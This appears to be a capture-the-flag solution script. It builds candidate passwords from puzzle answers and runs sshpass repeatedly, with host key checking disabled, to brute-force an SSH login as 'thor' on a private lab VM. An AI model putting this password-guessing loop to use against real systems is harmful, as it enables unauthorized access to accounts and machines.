import os
import time
from sys import stdout

answer12 = "\"Publicspeakingisveryeasy.12624120720";
answer3 = "1b214";
answer4 = "9";
answer5 = [];
# ans5 = ["/?O_o", " 0@Pp`", "%5EUe", "+;K[k", "-=M]m", "!1AQaq"]; 
ans5 = ["o", "p0P", "e5EU", "kK", "Mm", "1AQaq"];
answer6 = "426135\"";
cmd_1 = "sshpass -p ";
cmd_2 = " ssh -o StrictHostKeyChecking=no -p 22 thor@192.168.56.101";
answers = [];

for j in range(0, 3):
    for k in range (0, 4):
        for l in range (0, 2): 
            for m in range (0, 2):
                for n in range (0, 5):
                    tmp = ans5[0][0] + ans5[1][j] + ans5[2][k] + ans5[3][l] + ans5[4][m] + ans5[5][n];
                    answer5.append(tmp);

for ans5 in answer5:
    tmp = answer12 + answer3 + answer4 + ans5 + answer6;
    answers.append(tmp);

for answer in answers:
    cmd = cmd_1 + answer + cmd_2;
    os.system(cmd)
    stdout.write(answer + "\n")
